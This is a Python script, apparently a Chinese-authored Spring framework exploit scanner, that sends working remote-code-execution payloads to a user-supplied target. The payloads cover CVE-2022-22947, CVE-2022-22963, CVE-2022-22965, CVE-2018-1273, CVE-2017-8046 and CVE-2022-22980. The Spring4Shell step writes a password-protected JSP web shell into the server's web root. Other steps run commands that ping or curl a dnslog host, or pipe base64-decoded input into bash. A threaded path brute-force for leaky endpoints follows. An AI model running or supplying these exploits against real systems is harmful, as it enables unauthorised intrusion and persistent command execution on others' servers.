#coding:utf-8
import requests
import json
import colorama
from colorama import init
import time
import queue
import sys
import urllib3
import threading
import base64
from time import sleep
import time
init(autoreset=True)
dnslog=input("请输入dnslog.py运行后获得的结果：")
url=input("输入想要测试的域名或IP：")
print("")
##v1.3 去除1.2版本需要vps的前提，增加CVE-2018-1273，CVE-2017-8046，现在使用dnslog.py调用dnslog验证无回显漏洞
##by Skr11lex & 一江明月


###############################################################################################################################
print("########################################################")
#cve-2022-22947
headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
    'Content-Type': 'application/json'
}
routename="Ss"
data = {"id": routename,
             "filters": [{"name": "AddResponseHeader",
             "args": {"name": "Result",
             "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}],
             "uri": "http://hello.com"}
r=requests.post(url+"actuator/gateway/routes/"+routename,headers=headers,data=json.dumps(data))
if r.status_code==201:##创建
    r=requests.post(url+"actuator/gateway/refresh",headers=headers,data=json.dumps(data))
    if r.status_code==200:##刷新
        r=requests.get(url+"actuator/gateway/routes/"+routename,headers=headers,data=json.dumps(data))
        if r.status_code==200:##判断并输出结果
            print(colorama.Fore.CYAN+"[+1+]"+url+"存在CVE-2022-22947漏洞，输出结果")
            print("########################################################")
            a=r.json()
            print(colorama.Fore.CYAN+a['filters'][0].split("'")[1])
else:
    print("[-1-]"+url+"目标不存在CVE-2022-22947漏洞")
    print("########################################################")
print('')
print("########################################################")

#cve-2022-22963
command='curl '+dnslog
payload = f'T(java.lang.Runtime).getRuntime().exec("{command}")'##构造payload，直接执行command
headers2 = {
    'spring.cloud.function.routing-expression': payload,
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}
path = 'functionRouter'
data = 'test'
r1 = requests.post(url=url+path, headers=headers2, data=data,)
if r1.status_code == 500:
    print(colorama.Fore.CYAN+"[+2+]" + url + "可能存在cve-2022-22963，返回终端看有无Dnslog请求")
    print("########################################################")
else:
    print("[-2-]"+url+"目标不存在CVE-2022-22963漏洞")
    print("########################################################")




print('')
print("########################################################")
#cve-2022-22965，这个误报可能性很大，但是不想改
headers3 = {
    "suffix": "%>//",
    "c1": "Runtime",
    "c2": "<%",
    "DNT": "1",
    "Content-Type": "application/x-www-form-urlencoded",
}
url1=url+'?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='##payload
r=requests.get(url=url1,headers=headers3)
if r.status_code==200:
    print(colorama.Fore.CYAN+"[+3+]"+url+"目标可能存在CVE-2022-22965漏洞，访问"+url+"tomcatwar.jsp?pwd=j&cmd=id")
    print("########################################################")
else:
    print("[-3-]"+url+"目标不存在CVE-2022-22965漏洞")
    print("########################################################")


print('')
print("########################################################")
#cve-2018-1273
cve_2018_1273path='users'
cve_2018_1273payload='username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("ping '+dnslog+'")]=&password=&repeatedPassword='
cve_2018_1273headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
    'Content-Type':'application/x-www-form-urlencoded'
}
cve_2018_1273request=requests.post(url=url+cve_2018_1273path,headers=cve_2018_1273headers,data=cve_2018_1273payload)
if cve_2018_1273request.status_code==500:
    print(colorama.Fore.CYAN+"[+4+]" + url + '可能存在CVE-2018-1273，返回终端看有无Dnslog请求')
    print("########################################################")
else:
    print('#'"[-4-]"+url+'目标不存在CVE-2018-1273漏洞')
    print("########################################################")




print('')
print("########################################################")
#CVE-2017-8046
cve_2017_8046_base1=('ping '+dnslog)
cve_2017_8046_base2=cve_2017_8046_base1.encode('utf-8')
cve_2017_8046_base3=str(base64.b64encode(cve_2017_8046_base2))
cve_2017_8046_base_drop1=cve_2017_8046_base3.strip('b')
cve_2017_8046_base_drop2=cve_2017_8046_base_drop1.strip("'")
cve_2017_8046_base_drop_end=cve_2017_8046_base_drop2
cve_2017_8046_payload1=('bash -c {echo,'+cve_2017_8046_base_drop_end+'}|{base64,-d}|{bash,-i}').encode()
cve_2017_8046_payload_end = ','.join(str(i) for i in list(cve_2017_8046_payload1))##118-125行对payload进行base，ascii编码

cve_2017_8046_d=(
'[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{'+cve_2017_8046_payload_end+'}))/lastname", "value": "vulhub" }]'
)##构造payload
cve_2017_8046_h={
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
    'Content-Type': 'application/json-patch+json'
}
cve_2017_8046_path='customers/1'##漏洞路径
cve_2017_8046_r=requests.patch(url=url+cve_2017_8046_path,headers=cve_2017_8046_h,data=cve_2017_8046_d)
if cve_2017_8046_r.status_code==400:
    print(colorama.Fore.CYAN+"[+5+]" + url + '可能存在CVE-2017-8046，返回终端看有无Dnslog请求')
    print("########################################################")
else:
    print('#'"[-5-]" + url + '目标不存在CVE-2017-8046漏洞')
    print("########################################################")

##cve_2022_22980
print('')
print(colorama.Fore.CYAN+'cve-2022-22980正在验证中，请稍等')
cve_2022_22980_path='demo'
cve_2022_22980_data='keyword=T(java.lang.Runtime).getRuntime().exec("ping '+dnslog+'")'
cve_2022_22980_headers={
    'Content-Type':'application/x-www-form-urlencoded',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
}
cve_2022_22980_r=requests.post(url=url+cve_2022_22980_path,headers=cve_2022_22980_headers,data=cve_2022_22980_data)

if cve_2022_22980_r.status_code==500:
    print(colorama.Fore.CYAN + "[+6+]" + url + '可能存在CVE-2022-22980，返回终端看有无Dnslog请求')
    print("########################################################")
else:
    print('#'"[-6-]" + url + '目标不存在CVE-2022-22980漏洞')
    print("########################################################")




print('')
print("Spring敏感接口扫描开始")
def get_path(url,file = "目录字典.txt"):
    path_queue = queue.Queue()
    f = open(file, "r", encoding="gbk")
    for i in f.readlines():
        path = url + i.strip()
        path_queue.put(path)
    f.close()
    return path_queue


def get_url(path_queue):
    while not path_queue.empty():
        try:
            url = path_queue.get()
            http = urllib3.PoolManager()
            respone = http.request('GET', url)
            if respone.status == 200:
                #print("[%d] => %s" % (respone.status, url))
                print(colorama.Fore.CYAN+"以下URL可能存在Spring boot信息泄露")
                print( url)
        except:
            pass
    else:
        sys.exit()

def main(url, threadNum):
    path_queue = get_path(url)
    threads = []
    for i in range(threadNum):
        t = threading.Thread(target=get_url, args=(path_queue, ))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

if __name__ == "__main__":
    #1.输入Url和线程大小
    start = time.time()

    url = url
    #threadnum = int(input("输入线程数量: "))
    threadnum=10
    main(url, threadnum)
    end = time.time()
    print("总共耗时 %.2f" % (end-start))
    colorama.init()


print("扫描完毕")

end=input('你的支持是我的动力，如果觉得写得不错，欢迎关注微信公众号：http://mrw.so/6fMUda')

